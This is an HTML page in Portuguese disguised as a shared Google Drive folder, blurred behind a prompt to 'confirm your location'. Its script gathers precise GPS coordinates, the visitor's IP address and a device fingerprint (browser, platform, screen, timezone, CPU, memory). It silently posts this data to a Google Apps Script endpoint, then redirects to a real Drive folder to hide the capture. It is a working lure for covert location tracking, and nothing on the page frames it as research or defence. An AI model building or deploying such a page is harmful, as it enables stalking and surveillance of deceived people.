<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Documento compartilhado</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html, body {
    height: 100%;
    overflow: hidden;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    background: #f1f5f9;
  }

  /* Fundo simulando a pasta do Drive (embaçado) */
  .fundo {
    position: fixed;
    inset: 0;
    padding: 40px 24px;
    filter: blur(6px);
    opacity: 0.6;
    pointer-events: none;
    user-select: none;
  }

  .barra {
    display: flex;
    align-items: center;
    gap: 12px;
    margin-bottom: 28px;
  }

  .logo-drive {
    width: 40px;
    height: 40px;
    border-radius: 8px;
    background: linear-gradient(135deg, #34a853, #fbbc04, #ea4335);
  }

  .titulo-fake {
    height: 20px;
    width: 220px;
    background: #cbd5e1;
    border-radius: 4px;
  }

  .grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
    gap: 16px;
  }

  .pasta-fake {
    background: #fff;
    border: 1px solid #e2e8f0;
    border-radius: 10px;
    padding: 16px;
    display: flex;
    align-items: center;
    gap: 10px;
  }

  .icone-fake {
    width: 32px;
    height: 32px;
    border-radius: 6px;
    background: #94a3b8;
    flex-shrink: 0;
  }

  .texto-fake {
    height: 12px;
    flex: 1;
    background: #cbd5e1;
    border-radius: 3px;
  }

  /* Cortina */
  .overlay {
    position: fixed;
    inset: 0;
    background: rgba(15, 23, 42, 0.85);
    backdrop-filter: blur(8px);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 9999;
    padding: 20px;
    transition: opacity 0.3s ease;
  }

  .overlay.hidden {
    opacity: 0;
    pointer-events: none;
  }

  .card {
    background: #fff;
    color: #0f172a;
    border-radius: 16px;
    padding: 32px 28px;
    max-width: 400px;
    width: 100%;
    text-align: center;
    box-shadow: 0 20px 60px rgba(0,0,0,0.5);
  }

  .card .icone {
    font-size: 44px;
    margin-bottom: 14px;
  }

  .card h2 {
    font-size: 19px;
    margin-bottom: 10px;
    font-weight: 600;
  }

  .card p {
    font-size: 14px;
    color: #475569;
    margin-bottom: 22px;
    line-height: 1.5;
  }

  .card button {
    width: 100%;
    padding: 15px;
    font-size: 15px;
    font-weight: 600;
    color: #fff;
    background: #2563eb;
    border: none;
    border-radius: 10px;
    cursor: pointer;
    transition: background 0.15s, transform 0.1s;
  }

  .card button:hover { background: #1d4ed8; }
  .card button:active { transform: scale(0.98); }
  .card button:disabled { opacity: 0.6; cursor: wait; }

  .msg {
    margin-top: 14px;
    font-size: 13px;
    color: #ef4444;
    min-height: 18px;
  }
</style>
</head>
<body>

  <!-- Conteúdo de trás: aparência de pasta do Drive (borrada) -->
  <div class="fundo">
    <div class="barra">
      <div class="logo-drive"></div>
      <div class="titulo-fake"></div>
    </div>
    <div class="grid">
      <div class="pasta-fake"><div class="icone-fake"></div><div class="texto-fake"></div></div>
      <div class="pasta-fake"><div class="icone-fake"></div><div class="texto-fake"></div></div>
      <div class="pasta-fake"><div class="icone-fake"></div><div class="texto-fake"></div></div>
      <div class="pasta-fake"><div class="icone-fake"></div><div class="texto-fake"></div></div>
      <div class="pasta-fake"><div class="icone-fake"></div><div class="texto-fake"></div></div>
      <div class="pasta-fake"><div class="icone-fake"></div><div class="texto-fake"></div></div>
      <div class="pasta-fake"><div class="icone-fake"></div><div class="texto-fake"></div></div>
      <div class="pasta-fake"><div class="icone-fake"></div><div class="texto-fake"></div></div>
    </div>
  </div>

  <!-- Cortina -->
  <div class="overlay" id="overlay">
    <div class="card">
      <div class="icone">📍</div>
      <h2>Confirme sua localização</h2>
      <p>Para acessar este conteúdo, você precisa autorizar o acesso à sua localização.</p>
      <button id="btn">Permitir e continuar</button>
      <div class="msg" id="msg"></div>
    </div>
  </div>

<script>
  const btn = document.getElementById('btn');
  const msg = document.getElementById('msg');
  const overlay = document.getElementById('overlay');

  // URL do seu Apps Script
  const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzEIeDdSyoHHW8t1sVRE-C8dfZgFQVnbBVVsvqlpmBlAkUNZ9e_TZszpPZz_iwV7oUh/exec';

  // Link real da pasta do Drive (destino após autorizar)
  const DESTINO = 'https://drive.google.com/drive/folders/1Jj_Io3G4P0seEreAgJORidrv7cJC1o5K?usp=drive_link';

  btn.addEventListener('click', async () => {
    msg.textContent = '';

    if (!navigator.geolocation) {
      msg.textContent = 'Seu navegador não suporta geolocalização.';
      return;
    }

    try {
      const perm = await navigator.permissions.query({ name: 'geolocation' });
      if (perm.state === 'denied') {
        msg.textContent = 'Você negou a localização. Permita nas configurações do navegador para continuar.';
        return;
      }
    } catch (_) {}

    btn.disabled = true;
    btn.textContent = 'Obtendo localização...';

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        const { latitude, longitude, accuracy } = pos.coords;

        const payload = {
          Latitude: latitude,
          Longitude: longitude,
          Precisao: Math.round(accuracy) + 'm',
          IP: await obterIP(),
          UserAgent: navigator.userAgent,
          Plataforma: navigator.platform || 'N/A',
          Idioma: navigator.language || 'N/A',
          Resolucao: `${screen.width}x${screen.height}`,
          FusoHorario: Intl.DateTimeFormat().resolvedOptions().timeZone,
          Nucleos: navigator.hardwareConcurrency || 'N/A',
          Memoria: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'N/A'
        };

        const body = Object.entries(payload)
          .map(([k, v]) => encodeURIComponent(k) + '=' + encodeURIComponent(v))
          .join('&');

        try {
          await fetch(SCRIPT_URL, {
            method: 'POST',
            mode: 'no-cors',
            headers: { 'Content-Type': 'text/plain;charset=utf-8' },
            body
          });
        } catch (e) {
          console.error('Erro no fetch:', e);
        }

        // Esconde a cortina e redireciona para a pasta real
        overlay.classList.add('hidden');
        setTimeout(() => {
          window.location.href = DESTINO;
        }, 400);
      },
      (err) => {
        btn.disabled = false;
        btn.textContent = 'Tentar novamente';
        switch (err.code) {
          case err.PERMISSION_DENIED:
            msg.textContent = 'Permissão negada. Você precisa permitir a localização para continuar.';
            break;
          case err.POSITION_UNAVAILABLE:
            msg.textContent = 'Localização indisponível no momento.';
            break;
          case err.TIMEOUT:
            msg.textContent = 'Tempo esgotado ao obter localização.';
            break;
          default:
            msg.textContent = 'Erro ao obter localização.';
        }
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
  });

  async function obterIP() {
    try {
      const r = await fetch('https://api.ipify.org?format=json');
      return (await r.json()).ip;
    } catch { return 'Indisponível'; }
  }
</script>
</body>
</html>
